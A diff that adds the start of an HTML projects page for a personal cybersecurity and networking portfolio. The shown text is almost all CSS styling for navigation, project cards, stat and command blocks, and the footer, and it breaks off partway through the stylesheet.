@@ -1,0 +1,2786 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8" />
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon_io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon_io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon_io/favicon-16x16.png">
+    <link rel="manifest" href="favicon_io/site.webmanifest">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Projects | Solekhdzhon Khuseynov</title>
+    <meta name="description" content="Cybersecurity and networking projects by Solekhdzhon Khuseynov." />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --green: #00ff9d;
+            --green-dim: #00cc7a;
+            --green-glow: rgba(0, 255, 157, 0.15);
+            --green-glow-strong: rgba(0, 255, 157, 0.3);
+            --red: #ff0055;
+            --blue: #00aaff;
+            --yellow: #ffd700;
+            --orange: #ff8c00;
+            --purple: #aa55ff;
+            --bg: #030508;
+            --bg2: #070b0f;
+            --bg3: #0c1219;
+            --border: rgba(0, 255, 157, 0.12);
+            --border-hover: rgba(0, 255, 157, 0.35);
+            --text: #c8d8e8;
+            --text-dim: #5a7a8a;
+            --text-bright: #e8f4f8;
+            --mono: 'Space Mono', monospace;
+            --display: 'Syne', sans-serif;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: var(--display);
+            background: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            cursor: default;
+        }
+
+        * { cursor: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpolygon points='0,0 0,14 4,10 7,16 9,15 6,9 12,9' fill='%2300ff9d' stroke='%23030508' stroke-width='1'/%3E%3C/svg%3E"), auto; }
+        a, button, [role="button"], input, label, select, textarea, [tabindex] {
+            cursor: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpolygon points='0,0 0,14 4,10 7,16 9,15 6,9 12,9' fill='%2300ff9d' stroke='%23030508' stroke-width='1'/%3E%3C/svg%3E"), pointer;
+        }
+
+        body::before {
+            content: '';
+            position: fixed; inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
+            pointer-events: none; z-index: 1000;
+        }
+
+        .grid-bg {
+            position: fixed; inset: 0;
+            background-image: linear-gradient(rgba(0,255,157,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,157,0.03) 1px, transparent 1px);
+            background-size: 40px 40px; z-index: 0;
+        }
+        .corner-accent { position: fixed; width: 300px; height: 300px; pointer-events: none; z-index: 1; }
+        .corner-accent.tl { top: 0; left: 0; background: radial-gradient(circle at 0 0, rgba(0,255,157,0.06), transparent 70%); }
+        .corner-accent.br { bottom: 0; right: 0; background: radial-gradient(circle at 100% 100%, rgba(0,170,255,0.05), transparent 70%); }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: rgba(0,255,157,0.2); border-radius: 2px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(0,255,157,0.4); }
+
+        /* NAV */
+        nav {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+            padding: 0 2rem; height: 64px;
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+            background: rgba(3,5,8,0.85); backdrop-filter: blur(20px);
+        }
+        .nav-logo { text-decoration: none; display: flex; align-items: center; }
+        .nav-logo img { height: 60px; width: auto; display: block; }
+        .nav-links { display: flex; align-items: center; gap: 2.5rem; list-style: none; }
+        .nav-links a {
+            font-family: var(--mono); font-size: 0.75rem; color: var(--text-dim);
+            text-decoration: none; letter-spacing: 0.1em; text-transform: uppercase; transition: color 0.2s; position: relative;
+        }
+        .nav-links a::before { content: '//'; margin-right: 0.3em; opacity: 0; color: var(--green); transition: opacity 0.2s; }
+        .nav-links a:hover, .nav-links a.active { color: var(--green); background: rgba(0,255,157,0.055); border-color: rgba(0,255,157,0.14); }
+        .nav-links a:hover::before, .nav-links a.active::before { opacity: 1; }
+        .nav-status { display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.7rem; color: var(--text-dim); }
+        .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: pulse-dot 2s ease-in-out infinite; }
+        @keyframes pulse-dot { 0%,100%{ box-shadow: 0 0 0 0 rgba(0,255,157,0.4); } 50%{ box-shadow: 0 0 0 6px rgba(0,255,157,0); } }
+        .hamburger { display: none; flex-direction: column; gap: 5px; background: none; border: none; cursor: pointer; padding: 4px; }
+        .hamburger span { display: block; width: 22px; height: 1px; background: var(--green); transition: all 0.3s; }
+        .mobile-menu {
+            display: none; position: fixed; top: 64px; left: 0; right: 0;
+            background: rgba(3,5,8,0.97); border-bottom: 1px solid var(--border);
+            padding: 2rem; z-index: 499; flex-direction: column; gap: 1.5rem;
+        }
+        .mobile-menu.open { display: flex; }
+        .mobile-menu a { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); text-decoration: none; letter-spacing: 0.1em; text-transform: uppercase; transition: color 0.2s; }
+        .mobile-menu a:hover, .mobile-menu a.active { color: var(--green); }
+
+        /* HERO */
+        .hero {
+            position: relative; z-index: 2;
+            min-height: 70vh; display: flex; align-items: center;
+            padding: 120px 2rem 80px;
+        }
+        .hero-inner { max-width: 900px; margin: 0 auto; width: 100%; }
+        .hero-label {
+            font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.2em; text-transform: uppercase;
+            color: var(--green); margin-bottom: 2rem; display: flex; align-items: center; gap: 1rem;
+            opacity: 0; animation: fadeUp 0.6s 0.2s forwards;
+        }
+        .hero-label::before { content: ''; flex: 0 0 40px; height: 1px; background: var(--green); }
+        .hero h1 {
+            font-family: var(--display); font-size: clamp(3.5rem, 9vw, 7rem);
+            font-weight: 800; line-height: 0.95; letter-spacing: -0.02em; margin-bottom: 2rem;
+            opacity: 0; animation: fadeUp 0.6s 0.35s forwards;
+        }
+        .hero h1 .line-1 { color: var(--text-bright); display: block; }
+        .hero h1 .line-2 { display: block; color: transparent; -webkit-text-stroke: 1px var(--green); }
+        .hero-desc {
+            font-family: var(--mono); font-size: 0.85rem; line-height: 1.8;
+            color: var(--text-dim); max-width: 520px; margin-bottom: 3rem;
+            opacity: 0; animation: fadeUp 0.6s 0.5s forwards;
+        }
+        .hero-stats { display: flex; gap: 3rem; opacity: 0; animation: fadeUp 0.6s 0.65s forwards; }
+        .hero-stat-val { font-family: var(--mono); font-size: 2rem; font-weight: 700; color: var(--green); line-height: 1; }
+        .hero-stat-label { font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text-dim); margin-top: 0.4rem; }
+        .hero-scroll-indicator {
+            position: absolute; bottom: 2rem; left: 50%; transform: translateX(-50%);
+            display: flex; flex-direction: column; align-items: center; gap: 0.5rem;
+            opacity: 0; animation: fadeIn 0.6s 1.2s forwards;
+        }
+        .hero-scroll-indicator span { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.2em; color: var(--text-dim); text-transform: uppercase; }
+        .scroll-line { width: 1px; height: 40px; background: linear-gradient(to bottom, var(--green), transparent); animation: scrollLine 1.5s ease-in-out infinite; }
+        @keyframes scrollLine {
+            0%{ transform: scaleY(0); transform-origin: top; }
+            50%{ transform: scaleY(1); transform-origin: top; }
+            51%{ transform: scaleY(1); transform-origin: bottom; }
+            100%{ transform: scaleY(0); transform-origin: bottom; }
+        }
+        @keyframes fadeUp { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+
+        /* PROJECTS SECTION */
+        .projects-section { position: relative; z-index: 2; padding: 0 2rem 8rem; }
+        .projects-toolbar {
+            max-width: 1100px;
+            margin: 0 auto 2.5rem;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 1rem 1.5rem;
+            padding: 1.2rem 1.4rem;
+            border: 1px solid var(--border);
+            background: linear-gradient(90deg, rgba(0,255,157,0.025), rgba(0,170,255,0.018));
+            backdrop-filter: none;
+            box-shadow: inset 0 0 0 1px rgba(255,255,255,0.015);
+        }
+        .projects-toolbar-copy {
+            min-width: 0;
+        }
+        .projects-toolbar-label {
+            font-family: var(--mono);
+            font-size: 0.62rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: var(--green);
+            margin-bottom: 0.45rem;
+        }
+        .projects-toolbar-title {
+            font-family: var(--display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text-bright);
+        }
+        .projects-filter-count {
+            font-family: var(--mono);
+            font-size: 0.72rem;
+            color: var(--text-dim);
+            margin-top: 0.35rem;
+        }
+        .filter-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.55rem;
+            justify-content: flex-end;
+        }
+        .filter-chip {
+            font-family: var(--mono);
+            font-size: 0.68rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: var(--text-dim);
+            background: transparent;
+            border: 1px solid var(--border);
+            padding: 0.62rem 0.88rem;
+            transition: border-color 0.2s, color 0.2s, background 0.2s, transform 0.2s;
+        }
+        .filter-chip:hover {
+            color: var(--green);
+            border-color: var(--border-hover);
+            background: rgba(0,255,157,0.06);
+            transform: translateY(-1px);
+        }
+        .filter-chip.active {
+            color: var(--bg);
+            border-color: var(--green);
+            background: var(--green);
+            box-shadow: 0 0 24px rgba(0,255,157,0.16);
+        }
+        .projects-wrapper { max-width: 1160px; margin: 0 auto; display: flex; flex-direction: column; gap: 2rem; }
+
+        .project-card {
+            position: relative;
+            border: 1px solid rgba(0,255,157,0.12);
+            background:
+                linear-gradient(180deg, rgba(255,255,255,0.016), rgba(255,255,255,0.008)),
+                linear-gradient(180deg, rgba(7,11,15,0.94), rgba(4,8,11,0.92));
+            opacity: 0;
+            transform: translateY(28px);
+            transition: opacity 0.7s, transform 0.18s ease-out, border-color 0.3s, box-shadow 0.3s;
+            transform-style: preserve-3d;
+            transform-origin: center center;
+            will-change: transform;
+            overflow: hidden;
+            border-radius: 28px;
+            --card-rotate-x: 0deg;
+            --card-rotate-y: 0deg;
+            --card-glare-x: 50%;
+            --card-glare-y: 50%;
+            --card-glare-opacity: 0;
+            --project-accent: #00ff9d;
+        }
+        .project-card.visible {
+            opacity: 1;
+            transform: perspective(1400px) translateY(0) rotateX(var(--card-rotate-x)) rotateY(var(--card-rotate-y));
+        }
+        .project-card:hover,
+        .project-card.is-tilting {
+            border-color: var(--border-hover);
+            box-shadow: 0 22px 58px rgba(0,0,0,0.34), 0 0 34px rgba(0,255,157,0.06);
+        }
+        .project-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at var(--card-glare-x) var(--card-glare-y), rgba(232,244,248,0.16), rgba(0,255,157,0.08) 18%, transparent 42%);
+            opacity: var(--card-glare-opacity);
+            transition: opacity 0.2s ease-out;
+            mix-blend-mode: screen;
+            pointer-events: none;
+            z-index: 1;
+        }
+        .project-card.hidden-by-filter { display: none; }
+        .project-card:nth-child(2n) { --project-accent: #00aaff; }
+        .project-card:nth-child(3n) { --project-accent: #ff8c00; }
+        .project-card:nth-child(5n) { --project-accent: #aa55ff; }
+
+        .card-number {
+            position: absolute;
+            top: 1.1rem;
+            right: 1.1rem;
+            z-index: 5;
+            font-family: var(--mono);
+            font-size: 0.62rem;
+            letter-spacing: 0.18em;
+            color: var(--project-accent);
+            padding: 0.45rem 0.8rem;
+            border: 1px solid rgba(255,255,255,0.12);
+            background: rgba(3,5,8,0.72);
+            border-radius: 999px;
+            backdrop-filter: blur(10px);
+        }
+        .card-inner {
+            display: grid;
+            grid-template-columns: minmax(0, 1fr) 320px;
+            position: relative;
+            z-index: 2;
+        }
+        .card-left {
+            display: grid;
+            grid-template-columns: minmax(0, 1fr) 280px;
+            grid-template-areas:
+                "header image"
+                "overview image"
+                "achievements image"
+                "stack image";
+            gap: 1rem;
+            padding: 1.35rem;
+            align-items: start;
+        }
+        .card-header {
+            grid-area: header;
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            padding: 1.1rem 1.15rem;
+            border: 1px solid rgba(255,255,255,0.08);
+            background: rgba(255,255,255,0.02);
+            border-radius: 20px;
+        }
+        .card-icon {
+            width: 72px;
+            height: 72px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--project-accent);
+            border: 1px solid color-mix(in srgb, var(--project-accent) 40%, rgba(255,255,255,0.08));
+            background: color-mix(in srgb, var(--project-accent) 12%, rgba(255,255,255,0.02));
+            border-radius: 18px;
+        }
+        .card-icon svg { width: 30px; height: 30px; }
+        .card-meta { min-width: 0; }
+        .card-type {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.45rem;
+            font-family: var(--mono);
+            font-size: 0.6rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: var(--project-accent);
+            margin-bottom: 0.55rem;
+        }
+        .card-type::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+            box-shadow: 0 0 10px currentColor;
+        }
+        .card-title {
+            font-family: var(--display);
+            font-size: clamp(1.9rem, 2.8vw, 3rem);
+            font-weight: 800;
+            line-height: 1;
+            letter-spacing: -0.03em;
+            color: var(--text-bright);
+        }
+        .card-subtitle {
+            font-family: var(--mono);
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            line-height: 1.7;
+            margin-top: 0.55rem;
+        }
+
+        .card-image {
+            grid-area: image;
+            position: sticky;
+            top: 90px;
+            align-self: start;
+            height: 520px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 22px;
+            background: rgba(0,0,0,0.3);
+        }
+        .card-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: contrast(1.04) saturate(1.05);
+            transition: transform 0.8s ease, filter 0.4s ease;
+        }
+        .project-card:hover .card-image img { transform: scale(1.04); }
+        .card-image::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background:
+                linear-gradient(180deg, rgba(3,5,8,0.12), rgba(3,5,8,0.46)),
+                linear-gradient(135deg, color-mix(in srgb, var(--project-accent) 12%, transparent), transparent 30%);
+            z-index: 1;
+        }
+        .card-image::after {
+            content: '';
+            position: absolute;
+            inset: auto 1rem 1rem 1rem;
+            height: 1px;
+            background: linear-gradient(90deg, var(--project-accent), transparent);
+            z-index: 2;
+        }
+        .img-overlay-label {
+            position: absolute;
+            left: 1rem;
+            top: 1rem;
+            z-index: 2;
+            font-family: var(--mono);
+            font-size: 0.58rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: var(--text-bright);
+            padding: 0.5rem 0.72rem;
+            border: 1px solid rgba(255,255,255,0.12);
+            background: rgba(3,5,8,0.55);
+            border-radius: 999px;
+            backdrop-filter: blur(8px);
+        }
+
+        .card-overview-label {
+            font-family: var(--mono);
+            font-size: 0.6rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: var(--project-accent);
+            margin-bottom: 0.5rem;
+        }
+        .card-left > .card-overview-label:nth-of-type(1) { grid-area: overview; margin-bottom: -0.45rem; }
+        .card-left > .card-overview-label:nth-of-type(2) { grid-area: achievements; margin-bottom: -0.45rem; }
+        .card-left > .card-overview-label:nth-of-type(3) { grid-area: stack; margin-bottom: -0.45rem; }
+        .card-desc,
+        .achievements,
+        .tech-tags {
+            border: 1px solid rgba(255,255,255,0.08);
+            background: rgba(255,255,255,0.016);
+            border-radius: 20px;
+        }
+        .card-desc {
+            grid-area: overview;
+            font-family: var(--mono);
+            font-size: 0.77rem;
+            line-height: 1.85;
+            color: var(--text-dim);
+            padding: 2rem 1.15rem 1.1rem;
+            margin: 0;
+        }
+        .achievements {
+            grid-area: achievements;
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+            padding: 2rem 1rem 1rem;
+            margin: 0;
+        }
+        .achievement-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.7rem;
+            font-family: var(--mono);
+            font-size: 0.71rem;
+            line-height: 1.6;
+            color: var(--text-dim);
+            padding: 0.75rem 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .achievement-item:last-child { border-bottom: none; }
+        .achievement-item::before {
+            content: '>';
+            color: var(--project-accent);
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+        .tech-tags {
+            grid-area: stack;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.55rem;
+            padding: 2rem 1rem 1rem;
+        }
+        .tech-tag {
+            font-family: var(--mono);
+            font-size: 0.62rem;
+            letter-spacing: 0.08em;
+            padding: 0.48rem 0.75rem;
+            border: 1px solid rgba(255,255,255,0.08);
+            color: var(--text-dim);
+            background: rgba(0,0,0,0.2);
+            text-transform: uppercase;
+            transition: all 0.2s;
+            border-radius: 999px;
+        }
+        .tech-tag:hover { border-color: var(--project-accent); color: var(--project-accent); background: rgba(255,255,255,0.03); }
+
+        .card-right {
+            padding: 1.35rem 1.35rem 1.35rem 0;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .stats-block,
+        .links-block,
+        .timeline-block,
+        .features-block,
+        .command-block {
+            border: 1px solid rgba(255,255,255,0.08);
+            padding: 1.05rem;
+            background: rgba(255,255,255,0.016);
+            border-radius: 18px;
+        }
+        .stats-block { background: rgba(255,255,255,0.022); }
+        .stats-block-title {
+            font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.2em; text-transform: uppercase;
+            color: var(--green); margin-bottom: 1.25rem; display: flex; align-items: center; gap: 0.5rem;
+        }
+        .stats-block-title::before { content: '//'; opacity: 0.5; }
+        .stat-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0.6rem 0; border-bottom: 1px solid rgba(255,255,255,0.04);
+            font-family: var(--mono); font-size: 0.72rem;
+        }
+        .stat-row:last-child { border-bottom: none; }
+        .stat-label { color: var(--text-dim); }
+        .stat-value { color: var(--green); font-weight: 700; }
+        .stat-value.blue { color: var(--blue); }
+        .stat-value.red { color: var(--red); }
+        .stat-value.orange { color: var(--orange); }
+        .stat-value.purple { color: var(--purple); }
+        .stat-value.ok { color: #00ff9d; }
+
+        .links-block-title,
+        .timeline-block-title,
+        .features-block-title,
+        .command-block-title {
+            font-family: var(--mono);
+            font-size: 0.6rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-dim);
+            margin-bottom: 1rem;
+        }
+        .project-link {
+            display: flex; align-items: center; gap: 0.75rem; padding: 0.75rem 1rem;
+            font-family: var(--mono); font-size: 0.72rem; text-decoration: none; color: var(--text-dim);
+            border: 1px solid transparent; transition: all 0.2s; margin-bottom: 0.5rem; letter-spacing: 0.05em;
+            border-radius: 14px;
+        }
+        .project-link:last-child { margin-bottom: 0; }
+        .project-link:hover { border-color: var(--border-hover); color: var(--green); background: var(--green-glow); }
+        .project-link.primary { border-color: var(--green); color: var(--green); background: var(--green-glow); }
+        .project-link.primary:hover { background: rgba(0,255,157,0.12); }
+        .link-arrow { margin-left: auto; opacity: 0; transition: opacity 0.2s, transform 0.2s; }
+        .project-link:hover .link-arrow { opacity: 1; transform: translateX(3px); }
+
+        .timeline-bar-row { margin-bottom: 1rem; }
+        .timeline-bar-label { display: flex; justify-content: space-between; font-family: var(--mono); font-size: 0.68rem; color: var(--text-dim); margin-bottom: 0.4rem; }
+        .timeline-bar-track { height: 3px; background: rgba(255,255,255,0.06); position: relative; overflow: hidden; }
+        .timeline-bar-fill { height: 100%; background: var(--green); transform: scaleX(0); transform-origin: left; transition: transform 1s cubic-bezier(0.4,0,0.2,1); }
+        .project-card.visible .timeline-bar-fill { transform: scaleX(1); }
+        .timeline-total { display: flex; justify-content: space-between; font-family: var(--mono); font-size: 0.72rem; padding-top: 0.75rem; border-top: 1px solid rgba(255,255,255,0.06); }
+        .timeline-total .label { color: var(--text-dim); }
+        .timeline-total .val { color: var(--green); font-weight: 700; }
+
+        .feature-item {
+            display: flex; align-items: center; gap: 0.6rem;
+            font-family: var(--mono); font-size: 0.72rem; color: var(--text-dim);
+            padding: 0.4rem 0; border-bottom: 1px solid rgba(255,255,255,0.04); transition: color 0.2s;
+        }
+        .feature-item:last-child { border-bottom: none; }
+        .feature-item:hover { color: var(--green); }
+        .feature-check { width: 14px; height: 14px; border: 1px solid var(--green); display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 0.55rem; color: var(--green); }
+
+        .command-block { background: rgba(0,0,0,0.4); }
+        .command-block-title::before { content: '//'; opacity: 0.5; color: var(--green); margin-right: 0.45rem; }
+        .cmd-line { font-family: var(--mono); font-size: 0.68rem; line-height: 1.7; color: var(--text-dim); margin-bottom: 0.35rem; display: flex; align-items: flex-start; gap: 0.5rem; word-break: break-all; }
+        .cmd-line .prompt { color: var(--green); flex-shrink: 0; margin-top: 0.05rem; }
+        .cmd-line .cmd-text { color: #a8c8d8; }
+        .cmd-line .cmd-flag { color: var(--blue); }
+        .cmd-line .cmd-path { color: rgba(0,255,157,0.7); }
+        .cmd-spacer { height: 0.6rem; }
+
+        /* FOOTER */
+        footer { position: relative; z-index: 2; border-top: 1px solid var(--border); padding: 3rem 2rem; }
+        .footer-inner {
+            max-width: 1200px; margin: 0 auto;
+            display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 2rem;
+        }
+        .footer-logo { text-decoration: none; display: flex; align-items: center; }
+        .footer-logo img { height: 60px; width: auto; display: block; }
+        .footer-links { display: flex; gap: 2rem; flex-wrap: wrap; }
+        .footer-links a { font-family: var(--mono); font-size: 0.7rem; color: var(--text-dim); text-decoration: none; letter-spacing: 0.1em; text-transform: uppercase; transition: color 0.2s; }
+        .footer-links a:hover, .footer-links a.active { color: var(--green); }
+        .footer-copy {
+            font-family: var(--mono); font-size: 0.65rem; color: var(--text-dim);
+            letter-spacing: 0.05em; width: 100%; text-align: center;
+            padding-top: 2rem; border-top: 1px solid var(--border); margin-top: 1rem;
+        }
+
+        /* BACK TO TOP */
+        .back-to-top {
+            position: fixed; bottom: 2rem; right: 2rem; z-index: 100;
+            width: 40px; height: 40px; border: 1px solid var(--border);
+            background: rgba(3,5,8,0.9); color: var(--green);
+            display: flex; align-items: center; justify-content: center;
+            opacity: 0; transform: translateY(10px); transition: all 0.3s;
+            font-family: var(--mono); font-size: 1rem;
+        }
+        .back-to-top.show { opacity: 1; transform: translateY(0); }
+        .back-to-top:hover { background: var(--green-glow); border-color: var(--green); }
+
+        /* RESPONSIVE */
+        @media (max-width: 900px) {
+            .nav-links, .nav-status { display: none; }
+            .hamburger { display: flex; }
+            .hero h1 { font-size: clamp(2.8rem, 10vw, 4.5rem); }
+            .hero-stats { gap: 1.5rem; }
+            .projects-toolbar {
+                align-items: flex-start;
+                justify-content: flex-start;
+            }
+            .filter-bar {
+                justify-content: flex-start;
+            }
+            .card-inner { grid-template-columns: 1fr; }
+            .card-left {
+                grid-template-columns: 1fr;
+                grid-template-areas:
+                    "header"
+                    "image"
+                    "overview"
+                    "achievements"
+                    "stack";
+            }
+            .card-image {
+                position: relative;
+                top: auto;
+                height: 280px;
+            }
+            .card-header {
+                position: static;
+                width: auto;
+            }
+            .card-right { padding: 0 1.35rem 1.35rem; }
+            .card-number { right: 1rem; top: 1rem; }
+        }
+        @media (max-width: 500px) {
+            nav { padding: 0 1.25rem; }
+            .hero { padding: 100px 1.25rem 60px; }
+            .projects-section { padding: 0 1.25rem 5rem; }
+            .projects-toolbar {
+                padding: 1rem;
+            }
+            .filter-chip {
+                width: 100%;
+                text-align: center;
+            }
+            .hero-stats { flex-wrap: wrap; gap: 1.25rem; }
+            .projects-wrapper { gap: 2rem; }
+            .card-left { min-height: 440px; }
+            .card-header {
+                grid-template-columns: 1fr;
+                gap: 0.6rem;
+            }
+            .card-icon {
+                width: 62px;
+                height: 62px;
+            }
+            .card-left { padding: 1rem; }
+            .card-image { height: 220px; }
+            .card-desc,
+            .achievements,
+            .tech-tags,
+            .stats-block,
+            .links-block,
+            .timeline-block,
+            .features-block,
+            .command-block { border-radius: 20px; }
+            .card-number {
+                position: static;
+                display: inline-flex;
+                margin: 1rem 1rem 0 auto;
+            }
+        }
+
+        /* PROJECTS TOTAL RESET */
+        .projects-wrapper {
+            max-width: 1120px;
+            gap: 1.35rem;
+        }
+        .project-card {
+            min-height: 0;
+            border-radius: 22px;
+            background:
+                linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.008)),
+                linear-gradient(180deg, rgba(7,11,15,0.96), rgba(4,8,11,0.94));
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+        .project-card::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: linear-gradient(180deg, var(--project-accent), transparent 88%);
+            opacity: 0.8;
+        }
+        .card-number {
+            top: 1rem;
+            right: 1rem;
+            padding: 0.4rem 0.7rem;
+            background: rgba(3,5,8,0.84);
+        }
+        .card-inner {
+            grid-template-columns: 1fr;
+        }
+        .card-left {
+            display: grid;
+            grid-template-columns: 240px minmax(0, 1fr);
+            grid-template-areas:
+                "image header"
+                "image overview"
+                "image achievements"
+                "image stack";
+            gap: 1rem 1.2rem;
+            padding: 1.1rem 1.1rem 0.9rem;
+            min-height: 0;
+        }
+        .card-image {
+            grid-area: image;
+            position: relative;
+            top: auto;
+            height: 100%;
+            min-height: 320px;
+            border-radius: 18px;
+            border: 1px solid rgba(255,255,255,0.08);
+            overflow: hidden;
+        }
+        .card-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.7s ease;
+        }
+        .card-image::before {
+            background:
+                linear-gradient(180deg, rgba(3,5,8,0.1), rgba(3,5,8,0.34)),
+                linear-gradient(135deg, color-mix(in srgb, var(--project-accent) 10%, transparent), transparent 28%);
+        }
+        .card-image::after {
+            inset: auto 0 0 0;
+            width: auto;
+            height: 52px;
+            transform: none;
+            border: none;
+            border-radius: 0;
+            background: linear-gradient(180deg, transparent, rgba(3,5,8,0.82));
+            backdrop-filter: none;
+        }
+        .img-overlay-label {
+            left: 0.85rem;
+            top: auto;
+            bottom: 0.85rem;
+            font-size: 0.55rem;
+            padding: 0.42rem 0.62rem;
+        }
+        .card-header {
+            grid-area: header;
+            position: static;
+            width: auto;
+            display: flex;
+            gap: 0.9rem;
+            align-items: flex-start;
+            padding: 0;
+        }
+        .card-icon {
+            width: 58px;
+            height: 58px;
+            border-radius: 14px;
+            box-shadow: none;
+        }
+        .card-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+        .card-meta {
+            padding: 0;
+            border: none;
+            background: transparent;
+            box-shadow: none;
+            border-radius: 0;
+        }
+        .card-title {
+            font-size: clamp(1.55rem, 2vw, 2.15rem);
+            line-height: 1.02;
+            max-width: none;
+            text-shadow: none;
+        }
+        .card-subtitle {
+            margin-top: 0.35rem;
+        }
+        .card-overview-label {
+            display: block;
+            margin-bottom: -0.4rem;
+        }
+        .card-left > .card-overview-label:nth-of-type(1) { grid-area: overview; align-self: start; }
+        .card-left > .card-overview-label:nth-of-type(2) { grid-area: achievements; align-self: start; }
+        .card-left > .card-overview-label:nth-of-type(3) { grid-area: stack; align-self: start; }
+        .card-desc,
+        .achievements,
+        .tech-tags {
+            background: rgba(255,255,255,0.018);
+            border: 1px solid rgba(255,255,255,0.07);
+            border-radius: 16px;
+        }
+        .card-desc {
+            grid-area: overview;
+            padding: 1.8rem 1rem 1rem;
+            font-size: 0.75rem;
+            line-height: 1.8;
+        }
+        .achievements {
+            grid-area: achievements;
+            padding: 1.8rem 0.95rem 0.9rem;
+        }
+        .achievement-item {
+            font-size: 0.69rem;
+            padding: 0.65rem 0;
+        }
+        .tech-tags {
+            grid-area: stack;
+            padding: 1.8rem 0.95rem 0.95rem;
+        }
+        .tech-tag {
+            font-size: 0.6rem;
+            padding: 0.42rem 0.68rem;
+        }
+        .card-right {
+            padding: 0 1.1rem 1.1rem;
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 0.85rem;
+        }
+        .stats-block,
+        .links-block,
+        .timeline-block,
+        .features-block,
+        .command-block {
+            border-radius: 16px;
+            padding: 0.95rem;
+        }
+        .stats-block-title,
+        .links-block-title,
+        .timeline-block-title,
+        .features-block-title,
+        .command-block-title {
+            margin-bottom: 0.8rem;
+        }
+
+        @media (max-width: 900px) {
+            .card-left {
+                grid-template-columns: 1fr;
+                grid-template-areas:
+                    "header"
+                    "image"
+                    "overview"
+                    "achievements"
+                    "stack";
+                padding: 1rem 1rem 0.9rem;
+            }
+            .card-image {
+                height: 220px;
+                min-height: 220px;
+            }
+            .card-right {
+                grid-template-columns: 1fr;
+                padding: 0 1rem 1rem;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .card-header {
+                flex-direction: column;
+            }
+            .card-image {
+                height: 200px;
+                min-height: 200px;
+            }
+            .card-number {
+                position: static;
+                margin: 0 1rem 0 auto;
+            }
+        }
+
+        /* PROJECTS POLISH OVERRIDE */
+        .projects-wrapper {
+            max-width: 1180px;
+            gap: 1.6rem;
+        }
+        .project-card {
+            border-radius: 24px;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
+        }
+        .project-card::after {
+            content: '';
